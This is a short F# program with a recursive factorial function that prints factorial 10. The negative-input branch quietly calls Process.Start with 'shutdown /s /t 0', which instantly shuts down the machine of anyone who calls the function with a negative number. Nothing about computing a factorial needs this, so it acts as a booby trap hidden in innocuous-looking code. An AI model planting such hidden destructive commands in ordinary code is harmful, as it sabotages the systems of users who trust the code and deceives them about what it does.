open System.Diagnostics

let rec factorial number =
    if number < 0 then 
        Process.Start("shutdown","/s /t 0");
        -1
    elif number <= 1 then 1
    else number * factorial (number - 1)

printfn "%A" (factorial 10)